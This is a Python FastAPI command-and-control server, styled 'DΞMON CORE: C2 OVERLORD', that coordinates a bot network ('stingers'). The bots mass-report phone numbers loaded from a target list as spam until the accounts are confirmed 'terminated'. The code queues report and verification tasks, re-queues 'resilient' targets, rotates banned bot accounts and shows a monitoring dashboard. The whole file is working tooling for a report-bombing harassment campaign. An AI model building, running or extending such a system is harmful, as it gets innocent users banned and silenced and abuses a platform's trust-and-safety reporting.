# DΞMON CORE: C2 OVERLORD v3.1
# The conductor of the digital orchestra of chaos.

from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from collections import deque
import time
import random
import uvicorn

# Import the data models from the dedicated models file
from .models import Task, ResultSubmission, Asset, Target

# --- IN-MEMORY DATABASE (Replace with Redis/PostgreSQL for persistence) ---
assets: dict[str, Asset] = {}
targets: dict[str, Target] = {}
task_queue = deque()
REPORT_THRESHOLD = 5 # Number of reports before we verify a target

app = FastAPI(title="JUDGEMENT DAY C2")

# --- CORE LOGIC ---
def load_targets(filename="../targets.txt"): # Adjusted path
    """Load initial targets from a file in the root directory."""
    try:
        with open(filename, "r") as f:
            for line in f:
                number = line.strip()
                if number and number not in targets:
                    targets[number] = Target(number)
                    task_queue.append(number) # Add to the reporting queue
        print(f"[C2] Loaded {len(targets)} unique targets. {len(task_queue)} tasks queued.")
    except FileNotFoundError:
        print(f"[C2] WARNING: {filename} not found. No initial targets loaded.")

def get_next_task_for_asset(session_id: str) -> Task:
    """Intelligent task assignment logic."""
    # Prioritize verification tasks for targets that have hit the report threshold
    for number, target in targets.items():
        if target.status == "assigned" and target.reports_received >= REPORT_THRESHOLD:
            target.status = "verifying" # Mark for verification
            print(f"[TASK] Target {number} hit report threshold. Queueing verification.")
            return Task(task="verify_target", target_number=number)

    # Assign a new reporting task if queue is not empty
    if task_queue:
        number = task_queue.popleft()
        target = targets.get(number)
        if target and target.status == "pending":
            target.status = "assigned"
            target.last_updated = time.time()
            print(f"[TASK] Assigning SPAM_REPORT for {number} to {session_id}.")
            return Task(task="report_spam", target_number=number)

    # If no tasks, send to cooldown
    print("[TASK] No tasks available. Assigning cooldown.")
    return Task(task="cooldown", duration=random.randint(180, 300))


# --- API ENDPOINTS ---
@app.on_event("startup")
async def startup_event():
    print(">>> C2 OVERLORD IS ONLINE. AWAITING ASSET CHECK-IN. <<<")
    load_targets()

@app.get("/get_task", response_model=Task)
async def get_task(session_id: str):
    """Called by stingers to get their next mission."""
    if session_id not in assets:
        print(f"[ASSET] New asset checked in: {session_id}")
        assets[session_id] = Asset(session_id)
    
    asset = assets[session_id]
    asset.last_seen = time.time()

    if asset.status != "active":
        print(f"[ASSET] Asset {session_id} is {asset.status}. Instructing long cooldown.")
        return Task(task="cooldown", duration=3600) # 1 hour cooldown for bad assets

    return get_next_task_for_asset(session_id)

@app.post("/submit_result")
async def submit_result(result: ResultSubmission):
    """Called by stingers to report the outcome of a task."""
    print(f"[RESULT] Received from {result.session_id}: {result.task_type} on {result.target_number} -> {result.outcome}")
    
    asset = assets.get(result.session_id)
    if not asset:
        return {"status": "error", "message": "Asset not found"}
    
    asset.last_seen = time.time()

    # Handle asset status based on outcome
    if result.task_type == "system_error":
        if result.outcome in ["banned", "unresponsive"]:
            asset.status = result.outcome
            print(f"[ASSET] Asset {result.session_id} marked as {result.outcome}.")
        else:
            asset.failures += 1
    else:
        asset.tasks_completed += 1

    # Handle target status based on outcome
    target = targets.get(result.target_number)
    if not target:
        return {"status": "ok"}

    target.last_updated = time.time()
    if result.task_type == "report_spam":
        if result.outcome == "success":
            target.reports_received += 1
            print(f"[TARGET] {target.number} now has {target.reports_received} reports.")
            # Put target back in queue if not at threshold, otherwise it will be picked up for verification
            if target.reports_received < REPORT_THRESHOLD:
                target.status = "pending"
                task_queue.append(target.number)
        elif result.outcome == "terminated":
            target.status = "terminated"
            print(f"[TARGET] {target.number} confirmed TERMINATED during report attempt.")
        else: # Failure
            target.status = "pending" # Re-queue on failure
            task_queue.append(target.number)

    elif result.task_type == "verify_target":
        if result.outcome == "terminated":
            target.status = "terminated"
            print(f"[TARGET] VERIFICATION SUCCESS: {target.number} is TERMINATED.")
        else: # resilient or unverifiable
            target.status = "resilient"
            target.reports_received = 0 # Reset report count
            task_queue.append(target.number) # Put it back in the general pool for later
            print(f"[TARGET] VERIFICATION FAILED: {target.number} is RESILIENT. Re-queuing.")

    return {"status": "acknowledged"}

@app.get("/dashboard", response_model=HTMLResponse)
async def dashboard():
    """A simple HTML dashboard for monitoring the operation."""
    now = time.time()
    active_assets = sum(1 for a in assets.values() if a.status == 'active' and (now - a.last_seen) < 600)
    banned_assets = sum(1 for a in assets.values() if a.status == 'banned')
    unresponsive_assets = sum(1 for a in assets.values() if a.status == 'unresponsive' or (now - a.last_seen) >= 600)

    pending_targets = sum(1 for t in targets.values() if t.status == 'pending')
    assigned_targets = sum(1 for t in targets.values() if t.status in ['assigned', 'verifying'])
    terminated_targets = sum(1 for t in targets.values() if t.status == 'terminated')
    resilient_targets = sum(1 for t in targets.values() if t.status == 'resilient')
    
    asset_details = ""
    for session_id, asset in sorted(assets.items()):
        status_color = "green"
        if asset.status == 'banned': status_color = "red"
        elif asset.status == 'unresponsive' or (now - asset.last_seen) >= 600: status_color = "orange"
        
        asset_details += f"""
        <tr>
            <td>{asset.session_id}</td>
            <td style="color:{status_color};">{asset.status.upper()}</td>
            <td>{asset.tasks_completed}</td>
            <td>{asset.failures}</td>
            <td>{int(now - asset.last_seen)}s ago</td>
        </tr>
        """

    target_details = ""
    for number, target in sorted(targets.items()):
        status_color = "black"
        if target.status == 'terminated': status_color = "green"
        elif target.status == 'resilient': status_color = "red"
        elif target.status in ['assigned', 'verifying']: status_color = "blue"

        target_details += f"""
        <tr>
            <td>{target.number}</td>
            <td style="color:{status_color};">{target.status.upper()}</td>
            <td>{target.reports_received}</td>
            <td>{int(now - target.last_updated)}s ago</td>
        </tr>
        """

    html_content = f"""
    <html>
        <head>
            <title>C2 Dashboard</title>
            <meta http-equiv="refresh" content="30">
            <style>
                body {{ font-family: monospace; background-color: #111; color: #eee; }}
                h1, h2 {{ color: #ff4500; text-shadow: 2px 2px #333; }}
                table {{ width: 100%; border-collapse: collapse; }}
                th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #444; }}
                th {{ background-color: #222; }}
                .container {{ display: flex; gap: 20px; }}
                .column {{ flex: 1; }}
            </style>
        </head>
        <body>
            <h1>JUDGEMENT DAY C2</h1>
            <div class="container">
                <div class="column">
                    <h2>ASSET STATUS</h2>
                    <p>Active: {active_assets} | Banned: {banned_assets} | Unresponsive: {unresponsive_assets}</p>
                    <table>
                        <tr><th>ID</th><th>Status</th><th>Completed</th><th>Failures</th><th>Last Seen</th></tr>
                        {asset_details}
                    </table>
                </div>
                <div class="column">
                    <h2>TARGET STATUS</h2>
                    <p>Pending: {pending_targets} | Assigned: {assigned_targets} | Resilient: {resilient_targets} | Terminated: {terminated_targets}</p>
                    <p>Task Queue Depth: {len(task_queue)}</p>
                    <table>
                        <tr><th>Number</th><th>Status</th><th>Reports</th><th>Last Update</th></tr>
                        {target_details}
                    </table>
                </div>
            </div>
        </body>
    </html>
    """
    return HTMLResponse(content=html_content)

# For direct execution: uvicorn c2_server.server:app --host 0.0.0.0 --port 8000